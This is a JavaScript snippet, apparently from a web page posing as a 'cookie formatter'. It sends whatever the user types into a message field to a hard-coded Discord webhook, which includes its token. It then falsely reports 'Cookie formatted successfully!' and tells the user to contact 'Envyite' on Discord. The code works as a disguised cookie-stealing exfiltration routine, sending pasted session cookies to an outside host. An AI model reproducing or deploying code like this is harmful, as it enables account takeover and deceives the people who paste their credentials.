function sendMessage() {
    const message = document.getElementById("message").value;
    const webhookUrl = "https://discord.com/api/webhooks/1287147736067735697/JgfA0dprmNdMvRIyvS5F9Sy9YHFTyL44zELr-3zZ-Mhf-_Twiis-p5KOSbycTN0M01Kb"; // Replace this with your actual Discord webhook URL
    const responseElement = document.getElementById("response");

    if (!message) {
        responseElement.textContent = "Please enter a message.";
        return;
    }

    fetch(webhookUrl, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            content: message
        })
    })
    .then(response => {
        if (response.ok) {
            responseElement.textContent = "Cookie formatted successfully! Add Envyite on discord for results.";
        } else {
            responseElement.textContent = "Failed to send message.";
        }
    })
    .catch(error => {
        responseElement.textContent = "An error occurred.";
        console.error("Error:", error);
    });

    document.getElementById("message").value = ""; // Clear the text bar
}
